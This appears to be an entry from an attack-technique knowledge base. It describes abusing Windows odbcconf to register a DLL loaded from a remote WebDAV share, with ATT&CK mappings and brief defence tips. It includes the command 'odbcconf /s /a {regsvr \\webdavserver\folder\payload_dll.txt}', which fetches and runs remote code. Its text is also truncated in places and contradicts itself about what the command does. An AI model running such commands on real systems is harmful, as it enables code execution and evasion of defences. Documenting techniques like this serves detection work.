---
id: 3e03382e-11c3-4a66-b085-7ae7f93192fe
name: Windows ODBC Driver Registration via Odbcconf
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:26.976699+00:00'
updated_at: '2023-04-10T20:37:11.025824+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Execution|TA0002 - Execution]]'
techniques:
- '[[Masquerading|T1036 - Masquerading]]'
- '[[Signed Binary Proxy Execution|T1218 - Signed Binary Proxy Execution]]'
tags:
- '[[Odbcconf]]'
- '[[Windows - Download and execute methods]]'
---

# Windows ODBC Driver Registration via Odbcconf

## Summary

The Windows ODBC Driver Registration procedure via Odbcconf is a technique used by attackers to execute malicious code. This technique involves the use of the legitimate Odbcconf tool to register an ODBC driver. Attackers can use this technique to execute malicious code that can evade detection by 

## Description

# Description

The Windows ODBC Driver Registration procedure via Odbcconf is a technique used by attackers to execute malicious code. This technique involves the use of the legitimate Odbcconf tool to register an ODBC driver. Attackers can use this technique to execute malicious code that can evade detection by security software. By using this technique, attackers can bypass application whitelisting and other security measures that rely on detecting malicious code. 

The Odbcconf tool is a legitimate command-line tool used to manage ODBC drivers and data sources. It is included with Windows and is commonly used by IT administrators and developers to configure ODBC drivers. Attackers can use this tool to register a malicious ODBC driver, which can then be used to execute malicious code. 

This technique can be used to achieve a variety of goals, including data theft, privilege escalation, and persistence. Attackers can use this technique to execute malicious code that can steal sensitive data, such as login credentials and financial information. They can also use it to escalate privileges and gain access to sensitive systems or data. Finally, attackers can use this technique to establish persistence on a compromised system, allowing them to maintain access even after the initial compromise has been detected and remediated.

 

## Requirements

1. Access to a Windows system with the Odbcconf tool installed

 

## Defense

1. Monitor for suspicious use of the Odbcconf tool

1. Implement application whitelisting to prevent the execution of unauthorized binaries

1. Use endpoint detection and response (EDR) solutions to detect and respond to suspicious activity

 

## Objectives

1. Register a malicious ODBC driver

1. Execute malicious code

 

# Instructions

1. The 'odbcconf' command is used to manage ODBC drivers and data sources. In this case, we are using it to register a new ODBC driver. The '/s' flag specifies that the driver should be registered system-wide. The '/a' flag specifies that we are adding a new driver. The '{regsvr \\webdavserver\folder\payload_dll.txt}' argument specifies the path to the DLL file that contains the ODBC driver.

 



**Code**: [[odbcconf /s /a {regsvr \\webdavserver\folder\paylo]]



> This command registers a new ODBC driver on the system. ODBC drivers are used to connect to various types of databases. By registering a new driver, we are making it possible to connect to a new type of database using ODBC. The path to the DLL file containing the driver must be specified in the command.

## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Execution|TA0002 - Execution]]

### Techniques

- [[Masquerading|T1036 - Masquerading]]
- [[Signed Binary Proxy Execution|T1218 - Signed Binary Proxy Execution]]

## Tags

- [[Odbcconf]]
- [[Windows - Download and execute methods]]


